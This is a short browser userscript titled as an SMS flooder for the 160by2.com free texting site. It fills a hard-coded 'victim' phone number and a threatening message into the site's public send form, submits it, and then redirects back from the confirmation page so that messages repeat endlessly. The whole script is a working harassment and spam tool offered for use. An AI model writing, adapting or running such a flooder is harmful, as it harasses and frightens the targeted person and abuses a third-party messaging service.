// ==UserScript==
// @name          160/2.com sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*160by2.com/*
// ==/UserScript==

var victim=2108270740; //Enter victims number here
var delay=0; // Enter delay in milliseconds if required


if(document.location=="http://160by2.com/publicsms_sendsms.aspx")
{
document.getElementById('txt_mobileno').value=victim;
document.getElementById('txt_send_sms').value='YOUR CELL WILL GO BOOOOOM IN 10 SECONDS :P'+Math.floor(Math.random()*1456484);
void(0);
document.getElementById('btnsendsms').click();
}

if(document.location=="http://160by2.com/publicsms_postview.aspx")
{
setTimeout('document.location="http://160by2.com/publicsms_sendsms.aspx"',delay);
}